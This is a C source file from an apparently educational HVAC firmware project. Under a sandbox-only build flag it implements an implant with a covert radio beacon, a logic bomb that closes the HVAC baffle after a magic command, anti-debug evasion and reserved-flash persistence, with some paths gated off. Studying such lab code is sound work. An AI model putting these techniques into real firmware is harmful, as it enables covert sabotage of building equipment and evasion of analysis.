// MIT License
//
// Copyright (c) 2026 Kevin Thomas
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//
// Author:  Kevin Thomas
// Email:   kevin@mytechnotalent.com
// GitHub:  https://github.com/mytechnotalent/hvac-automation-node
// File:    implant.c
// Desc:    Implements the SANDBOX_ONLY FROSTLINE implant: covert beacon,
//          logic bomb, rootkit hiding, CoreDebug anti-debug trap, and
//          reserved-sector persistence. Compiled only under SANDBOX_ONLY.
// Created: 2026

#include "implant.h"
#include "hvac.h"
#include "radio.h"
#include "servo.h"
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>

#ifdef SANDBOX_ONLY

#ifdef IMPLANT_HOST_MOCK
#include "implant_host.h"
/**
 * @brief Read the controllable mock CoreDebug DHCSR register.
 */
#define IMPLANT_DHCSR_READ (g_mock_implant_dhcsr)
/**
 * @brief Read the mock reserved-sector persistence marker.
 */
#define IMPLANT_FLASH_READ() (g_mock_implant_flash)
/**
 * @brief Store the persistence marker in the mock reserved sector.
 */
#define IMPLANT_FLASH_WRITE(value) (g_mock_implant_flash = (value))
#else
#include "hardware/flash.h"
#include "hardware/sync.h"
/**
 * @brief Read the real CoreDebug DHCSR register.
 */
#define IMPLANT_DHCSR_READ (*(volatile uint32_t *)HVAC_IMPLANT_DHCSR_ADDR)
/**
 * @brief Read the real reserved-sector staging marker.
 */
#define IMPLANT_FLASH_READ() (*(volatile uint8_t *)HVAC_IMPLANT_RESERVE_ADDR)
/**
 * @brief Erase and program the reserved-sector staging marker.
 *
 * @param value Marker byte to store in the reserved sector.
 * @return void
 */
static void implant_flash_write(uint8_t value) {
    uint8_t page[FLASH_PAGE_SIZE];
    uint32_t ints = save_and_disable_interrupts();
    memset(page, 0xFF, sizeof(page));
    page[0] = value;
    flash_range_erase(HVAC_IMPLANT_RESERVE_OFFSET, FLASH_SECTOR_SIZE);
    flash_range_program(HVAC_IMPLANT_RESERVE_OFFSET, page, FLASH_PAGE_SIZE);
    restore_interrupts(ints);
}
/**
 * @brief Write the staging marker into the reserved flash sector.
 */
#define IMPLANT_FLASH_WRITE(value) implant_flash_write(value)
#endif

/**
 * @brief Covert beacon magic preamble emitted to the local hub.
 */
const uint8_t IMPLANT_BEACON_MAGIC[IMPLANT_BEACON_MAGIC_LEN] = {
    0xDEu, 0xADu, 0xBEu, 0xEFu,
};

/**
 * @brief Fixed magic command that arms the logic bomb.
 */
const uint8_t IMPLANT_ARM_MAGIC[IMPLANT_ARM_MAGIC_LEN] = {
    'F', 'R', 'O', 'S', 'T', 'L', 'N', 'E',
};

/**
 * @brief Monotonic implant tick counter.
 */
static uint32_t g_implant_ticks;

/**
 * @brief True when the logic bomb has been armed by the magic command.
 */
static bool g_implant_armed;

/**
 * @brief Absolute tick at which an armed logic bomb actuates the baffle.
 */
static uint32_t g_implant_trigger_tick;

/**
 * @brief Runtime gate for the reserved-sector re-install path.
 *
 * The corrected build leaves this gate clear, so a present marker does
 * not re-arm the implant on boot.
 */
static volatile bool g_implant_reinstall_enabled;

/**
 * @brief Runtime gate for the rootkit hiding path.
 *
 * The corrected build leaves this gate clear, so the beacon is never
 * masked from the LCD or the maintenance log.
 */
static volatile bool g_implant_rootkit_enabled;

/**
 * @brief Runtime gate for the reserved-sector marker write.
 *
 * The corrected build leaves this gate clear, so no marker is written.
 */
static volatile bool g_implant_persist_enabled;

bool implant_debug_attached(void) {
    return (IMPLANT_DHCSR_READ &
            (IMPLANT_DHCSR_DEBUGEN | IMPLANT_DHCSR_HALT)) != 0u;
}

bool implant_armed(void) {
    return g_implant_armed;
}

bool implant_persistence_present(void) {
    return IMPLANT_FLASH_READ() == (uint8_t)IMPLANT_MARKER_BYTE;
}

bool implant_rootkit_active(void) {
    if (!g_implant_rootkit_enabled) {
        return false;
    }
    return implant_persistence_present() && !implant_debug_attached();
}

/**
 * @brief Write the persistence marker into the reserved flash sector.
 *
 * @param void No parameters.
 * @return void
 */
static void implant_persist(void) {
    if (!g_implant_persist_enabled) {
        return;
    }
    if (implant_persistence_present()) {
        return;
    }
    IMPLANT_FLASH_WRITE((uint8_t)IMPLANT_MARKER_BYTE);
}

/**
 * @brief Arm the logic bomb to fire after the trigger delay.
 *
 * @param void No parameters.
 * @return void
 */
static void implant_arm(void) {
    g_implant_armed = true;
    g_implant_trigger_tick = g_implant_ticks + IMPLANT_TRIGGER_DELAY_TICKS;
}

/**
 * @brief Actuate the baffle and persist the marker at the trigger.
 *
 * @param void No parameters.
 * @return void
 */
static void implant_detonate(void) {
    baffle_close();
    g_implant_armed = false;
    implant_persist();
}

/**
 * @brief Emit one covert beacon frame with magic and a synthetic blob.
 *
 * @param void No parameters.
 * @return void
 */
static void implant_beacon(void) {
    uint8_t frame[IMPLANT_BEACON_MAGIC_LEN + IMPLANT_BEACON_BLOB_LEN];
    memcpy(frame, IMPLANT_BEACON_MAGIC, IMPLANT_BEACON_MAGIC_LEN);
    frame[4] = (uint8_t)(g_implant_ticks & 0xFFu);
    frame[5] = (uint8_t)((g_implant_ticks >> 8u) & 0xFFu);
    frame[6] = IMPLANT_MARKER_BYTE;
    frame[7] = (uint8_t)(implant_debug_attached() ? 1u : 0u);
    radio_send_frame(HVAC_UART, frame, sizeof(frame));
}

void implant_tick(void) {
    g_implant_ticks += 1u;
    if (implant_debug_attached()) {
        return;
    }
    if ((g_implant_ticks % IMPLANT_BEACON_INTERVAL_TICKS) == 0u) {
        implant_beacon();
    }
    if (g_implant_armed && g_implant_ticks >= g_implant_trigger_tick) {
        implant_detonate();
    }
}

void implant_handle_command(const uint8_t *frame, size_t len) {
    if (frame == NULL || len < IMPLANT_ARM_MAGIC_LEN) {
        return;
    }
    if (memcmp(frame, IMPLANT_ARM_MAGIC, IMPLANT_ARM_MAGIC_LEN) != 0) {
        return;
    }
    implant_arm();
}

/**
 * @brief Apply the reserved-sector state on boot without re-installing.
 *
 * The corrected build leaves the re-install gate clear, so a present marker
 * never re-arms the implant. Only a first run writes the marker.
 *
 * @param void No parameters.
 * @return void
 */
static void implant_resume(void) {
    if (!implant_persistence_present()) {
        implant_persist();
        return;
    }
    if (g_implant_reinstall_enabled) {
        implant_arm();
    }
}

void implant_init(void) {
    g_implant_ticks = 0u;
    g_implant_armed = false;
    g_implant_trigger_tick = 0u;
    g_implant_reinstall_enabled = false;
    g_implant_rootkit_enabled = false;
    g_implant_persist_enabled = false;
    implant_resume();
}

#endif // SANDBOX_ONLY
